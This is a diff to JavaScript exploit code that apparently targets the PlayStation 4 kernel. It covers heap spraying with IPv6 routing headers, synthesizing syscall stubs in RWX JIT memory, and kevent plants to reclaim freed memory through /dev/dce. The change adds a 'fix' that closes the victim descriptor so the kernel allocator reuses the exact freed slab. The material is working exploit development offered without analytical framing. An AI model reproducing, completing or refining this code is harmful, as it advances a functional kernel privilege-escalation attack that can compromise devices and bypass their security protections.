@@ -9,10 +9,8 @@ import { HX1400_TABLES } from "./hx_tables.js";
 //   scan victims for [8]==(int)page && [12]==0 -> joined==1 -> replant
 //   flags=2 -> HELD. kevent(-23) is one-time setup AFTER this (pc 9108),
 //   NOT per attempt. dce = the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
-// v3: runtime libkernel rescan for stubs the stage-1 scanner missed.
-// v4: if rescan fails, SYNTHESIZE missing stubs: copy close(6) stub into RWX
-//     jitshm memory (jitshm_create=533), patch syscall number, register it.
 // v5: x86-64 stub scanner/synth (PS4 is x86-64, not AArch64).
+// v6: close(fd) before open("/dev/dce") so SLAB reclaims the exact victim.
 // ============================================================================
 
 const T = HX1400_TABLES;
@@ -72,11 +70,6 @@ function allocBuf(size) {
 function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }
 
 // --- stub resolution (x86-64, PS4/FreeBSD) ---
-// Orbis syscall stub shape:
-//    48 c7 c0 <imm32 LE>   mov rax, <syscall number>
-//    0f 05                 syscall
-//    c3                    ret
-// PS4 kernel is x86-64. This mirrors main.js's stage-1 scan.
 let SCAN_SEEN = 0;
 
 function findStubRaw(snum) {
@@ -140,7 +133,6 @@ function synthStub(targetNum) {
   const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
   if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
 
-  // copy 32 bytes of donor, then patch the imm32 at bytes 3..6
   for (let o = 0; o < 32; o += 4) {
     p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
   }
@@ -196,12 +188,11 @@ function scn64(name, a, b, c, d, e, f) {
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
-// ---------- stage-2 primitives (bytecode-exact) ----------
 function buildTemplate() {
   const tpl = allocBuf(512);
   zeroBuf(tpl);
-  tpl.dv.setUint8(1, 30);          // ip6r_len: (30+1)*8 = 248
-  tpl.dv.setUint8(3, 15);          // ip6r_segleft = 15
+  tpl.dv.setUint8(1, 30);
+  tpl.dv.setUint8(3, 15);
   for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
     tpl.dv.setUint32(off, TPL_LO, true);
     tpl.dv.setUint32(off + 4, TPL_HI, true);
@@ -212,7 +203,6 @@ function buildTemplate() {
 function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
 function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
 
-// marked(): getsockopt rc==0 && len==248 && +8==CCCC && +12==TTTT  (still armed)
 function marked(fd, rdb, lenp) {
   zeroBuf(rdb);
   lenp.dv.setUint32(0, RTH_LEN, true);
@@ -240,7 +230,6 @@ function phaseSpray(N) {
   return { fds, rth };
 }
 
-// ---------- stage 2: leak scan (probe() pc 5773-6760, faithful) ----------
 function phase2Leak(rootKq, fds) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -257,23 +246,35 @@ function phase2Leak(rootKq, fds) {
   for (let attempt = 1; attempt <= 6; attempt++) {
     if (target >= 0 || tries >= 32) break;
     log("KV-ATTEMPT", attempt + "/6");
-    for (const fd of fds) disarm(fd);
-    for (const fd of fds) rearm(fd, tpl);
+    for (const fd of fds) {
+      if (fd !== -1) disarm(fd);
+    }
+    for (const fd of fds) {
+      if (fd !== -1) rearm(fd, tpl);
+    }
     log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
 
     for (let ci = 0; ci < CANDS.length && target < 0 && tries < 32; ci++) {
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
       const fd = fds[vi];
-      if (!marked(fd, rdb, lenp)) continue;                 // must still be armed
+      if (fd === -1) continue;
+      
+      if (!marked(fd, rdb, lenp)) continue;
       if (disarm(fd) !== 0) continue;
-      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);     // open("/dev/dce",O_RDWR)
-      if (dce < 0) { rearm(fd, tpl); continue; }
+      
+      // --- FIX IS HERE: close the victim first! ---
+      scn("close", fd);
+      fds[vi] = -1; // Mark as dead for the scan loop
+      
+      // Now /dev/dce allocates the exact memory just freed
+      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
+      if (dce < 0) continue;
+      
       const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
-      const pageInt = Number(page & 0xffffffffn) | 0;       // (int)page
+      const pageInt = Number(page & 0xffffffffn) | 0;
       tries++;
 
-      // plant #1: {ident=(int)dce, filter=-18, flags=1, +16=90}
       zeroBuf(cl);
       cl.dv.setUint32(0, dce >>> 0, true);
       cl.dv.setInt16(8, -18, true);
@@ -283,10 +284,11 @@ function phase2Leak(rootKq, fds) {
       log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
       if (rc !== 0) continue;
 
-      // sweep all other victims
       let joined = 0;
       for (let j = 0; j < fds.length; j++) {
         if (j === vi) continue;
+        if (fds[j] === -1) continue;
+        
         zeroBuf(rdb);
         lenp.dv.setUint32(0, RTH_LEN, true);
         lenp.dv.setUint32(4, 0, true);
@@ -305,7 +307,6 @@ function phase2Leak(rootKq, fds) {
       }
 
       if (target >= 0 && joined === 1) {
-        // plant #2 (HELD): flags=2, no +16 write
         zeroBuf(cl);
         cl.dv.setUint32(0, dce >>> 0, true);
         cl.dv.setInt16(8, -18, true);
